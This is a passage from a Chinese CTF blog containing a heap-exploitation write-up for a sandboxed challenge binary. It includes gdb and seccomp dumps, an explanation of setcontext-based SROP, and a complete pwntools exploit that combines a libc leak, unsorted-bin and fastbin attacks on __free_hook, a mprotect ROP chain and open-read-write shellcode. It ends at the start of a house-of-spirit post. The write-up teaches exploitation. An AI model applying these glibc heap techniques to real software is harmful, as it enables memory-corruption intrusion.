0x7f41f9aa45dd</span><br><span class="line">0x7f41f9aa45dd &lt;_IO_2_1_stderr_+157&gt;:   0x41f9aa3660000000      0x000000000000007f</span><br><span class="line">0x7f41f9aa45ed &lt;_IO_2_1_stderr_+173&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f41f9aa45fd &lt;_IO_2_1_stderr_+189&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f41f9aa460d &lt;_IO_2_1_stderr_+205&gt;:   0x0000000000000000      0x41f9aa26e0000000</span><br><span class="line">0x7f41f9aa461d &lt;_IO_2_1_stderr_+221&gt;:   0x00fbad288700007f      0x41f9aa46a3000000</span><br></pre></td></tr></table></figure><p>利用脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x82</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+<span class="string">'\n'</span>)  <span class="comment">#0x82是为了防止read函数末尾补'\x0a'</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br></pre></td></tr></table></figure><p>有了libc基址，我们本可以再次利用fastbin attack修改掉malloc_hook为one_gadget直接get shell。但是，ida分析的时候发现存在沙箱函数<code>prctl</code>。可以使用<a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">secconp-tools</a>查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  unctf_orwheap seccomp-tools dump ./pwn      </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011</span><br><span class="line"> 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010</span><br><span class="line"> 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010</span><br><span class="line"> 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count)</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>禁掉execve函数，因此无法直接get shell。这时可以通过orw得到flag。但是没有可用的栈空间，于是我们可以利用setcontext函数调用srop来进行栈迁移，最后call mprotect -&gt; shellcode。</p><p>这时候可以利用堆空间来部署<code>SigreturnFrame()</code>，然后将利用fastbin attack将<code>__free_hook</code>的地址改成<code>setcontext</code>。在改写__free_hook之前我们需要利用unsorted bin attack来伪造chunk size。（不得不说，unsorted bin attack确实是打辅助的好手）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'2'</span>*<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>攻击效果<code>bck-&gt;fd = unsorted_chunks(av)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x7f9fe23c37a8-0x20                                                   </span><br><span class="line">0x7f9fe23c3788 &lt;_IO_stdfile_1_lock+8&gt;:  0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c3798 &lt;_IO_stdfile_0_lock+8&gt;:  0x00007f9fe23c1b78      0x0000000000000000</span><br><span class="line">0x7f9fe23c37a8 &lt;__free_hook&gt;:   0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c37b8 &lt;next_to_use.11232&gt;:     0x0000000000000000      0x0000000000000000</span><br><span class="line">0x7f9fe23c37c8 &lt;disallow_malloc_check&gt;: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>利用fastbin attack将<code>__free_hook</code>的地址改成<code>setcontext</code>，并布置好<code>SigreturnFrame()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(free_hook - <span class="number">0x13</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#栈迁移</span></span><br><span class="line">frame.rip = libc_base + <span class="number">0xbc375</span> <span class="comment">#: syscall; ret; 此rax=0，调用read</span></span><br><span class="line">payload = str(frame)</span><br><span class="line"><span class="keyword">print</span> len(frame)</span><br><span class="line">add(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span> + <span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'fff'</span> + p64(libc_base + libc.symbols[<span class="string">'setcontext'</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#触发SROP</span></span><br></pre></td></tr></table></figure><p>这里要说一下<code>setcontext</code>函数;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int setcontext(const ucontext_t *ucp);</span><br></pre></td></tr></table></figure><p>这个函数的作用主要是用户上下文的获取和设置,可以利用这个函数直接控制大部分寄存器和执行流:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/80i 0x7ffff7a7bb50</span><br><span class="line">   0x7ffff7a7bb50 &lt;setcontext&gt;: push   rdi</span><br><span class="line">   0x7ffff7a7bb51 &lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">   0x7ffff7a7bb58 &lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">   0x7ffff7a7bb5a &lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">   0x7ffff7a7bb5f &lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">   0x7ffff7a7bb65 &lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">   0x7ffff7a7bb6a &lt;setcontext+26&gt;:  syscall </span><br><span class="line">   0x7ffff7a7bb6c &lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">   0x7ffff7a7bb6d &lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">   0x7ffff7a7bb73 &lt;setcontext+35&gt;:  jae    0x7ffff7a7bbd0 &lt;setcontext+128&gt;</span><br><span class="line">   0x7ffff7a7bb75 &lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">   0x7ffff7a7bb7c &lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">   0x7ffff7a7bb7e &lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">   0x7ffff7a7bb85 &lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">   0x7ffff7a7bb8c &lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">   0x7ffff7a7bb93 &lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">   0x7ffff7a7bb97 &lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">   0x7ffff7a7bb9b &lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">   0x7ffff7a7bb9f &lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">   0x7ffff7a7bba3 &lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">   0x7ffff7a7bba7 &lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">   0x7ffff7a7bbae &lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">   0x7ffff7a7bbaf &lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">   0x7ffff7a7bbb3 &lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x7ffff7a7bbba &lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x7ffff7a7bbc1 &lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x7ffff7a7bbc5 &lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x7ffff7a7bbc9 &lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x7ffff7a7bbcd &lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">   0x7ffff7a7bbcf &lt;setcontext+127&gt;: ret    </span><br><span class="line">   0x7ffff7a7bbd0 &lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x3572a1]        # 0x7ffff7dd2e78</span><br><span class="line">   0x7ffff7a7bbd7 &lt;setcontext+135&gt;: neg    eax</span><br><span class="line">   0x7ffff7a7bbd9 &lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x7ffff7a7bbdc &lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">   0x7ffff7a7bbe0 &lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure><p>这里需要说明的是：</p><ol><li>一般是从<code>setcontext+53</code>开始用的,不然程序容易崩溃,主要是为了避开<code>fldenv [rcx]</code>这个指令。</li><li>64位中第一个参数刚好在rdi中，因此这里的rdi即frame的地址。</li><li><code>mov    rcx,QWORD PTR [rdi+0xa8]; push   rcx</code>即<code>mov rip，QWORD PTR [rdi+0xa8]</code>利用push是保证指向的内存可访问，否则就会crash。</li></ol><p>这是我们已经把栈迁移到<code>(free_hook) &amp; 0xfffffffffffff000</code> ，并可以在改地址处写入0x2000字节的数据，下面构造好ROP链即可</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"remote"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'idx: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'idx: '</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x60</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xf1'</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x78</span>,<span class="string">'0'</span>*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0x82</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line">        edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line">        <span class="comment"># gdb.attach(p)</span></span><br><span class="line">        add(<span class="number">0x68</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">6</span> + <span class="string">'\n'</span>)</span><br><span class="line">        add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">        leak=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        libc_base = leak - (<span class="number">0x7ffff7a89b00</span> <span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">        log.success(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line">        free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">        log.success(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'0'</span>*<span class="number">0x68</span>+<span class="string">'\xa1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x98</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(free_hook<span class="number">-0x20</span>))</span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">'2'</span>*<span class="number">0x60</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x70</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(free_hook - <span class="number">0x13</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> <span class="comment">#</span></span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (free_hook) &amp; <span class="number">0xfffffffffffff000</span> </span><br><span class="line">frame.rip = libc_base + <span class="number">0xbc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line"><span class="keyword">print</span> len(frame)</span><br><span class="line">add(<span class="number">0x68</span>, payload[<span class="number">0x80</span>:<span class="number">0x80</span> + <span class="number">0x60</span>])</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'fff'</span> + p64(libc_base + libc.symbols[<span class="string">'setcontext'</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, payload[:<span class="number">0x98</span>])</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x21102</span> </span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x202e8</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x1b92</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x33544</span></span><br><span class="line">jmp_rsp = libc_base + <span class="number">0x2a71</span></span><br><span class="line">payload = p64(pop_rdi_ret) + p64((free_hook) &amp; <span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x2000</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">10</span>)  <span class="comment">#mprotect调用号</span></span><br><span class="line">payload += p64(libc_base + <span class="number">0xbc375</span>)</span><br><span class="line">payload += p64(jmp_rsp)</span><br><span class="line">shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        sub rsp, 0x800</span></span><br><span class="line"><span class="string">        push 0x67616c66</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor esi, esi</span></span><br><span class="line"><span class="string">        mov eax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        cmp eax, 0</span></span><br><span class="line"><span class="string">        js failed</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edi, eax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edx, 0x100</span></span><br><span class="line"><span class="string">        xor eax, eax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov edx, eax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edi, 1</span></span><br><span class="line"><span class="string">        mov eax, edi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        jmp exit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        failed:</span></span><br><span class="line"><span class="string">        push 0x6c696166</span></span><br><span class="line"><span class="string">        mov edi, 1</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov edx, 4</span></span><br><span class="line"><span class="string">        mov eax, edi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        exit:</span></span><br><span class="line"><span class="string">        xor edi, edi</span></span><br><span class="line"><span class="string">        mov eax, 231</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        '''</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.send(payload + shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>堆学习之house of spirit</title>
      <link href="/2020/03/26/%E5%A0%86%E5%AD%A6%E4%B9%A0%E4%B9%8Bhouse-of-spirit/"/>
      <url>/2020/03/26/%E5%A0%86%E5%AD%A6%E4%B9%A0%E4%B9%8Bhouse-of-spirit/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一直对house of系列的利用模棱两可，现在刚好可以利用疫情在家的时间好好梳理一下。</p><p>house of spirit（以下简称hos）是 <code>the Malloc Maleficarum</code> 中的一种技术。该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><h3 id="how2heap源码分析"><a href="#how2heap源码分析" class="headerlink" title="how2heap源码分析"></a>how2heap源码分析</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c" target="_blank" rel="noopener">源码</a></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 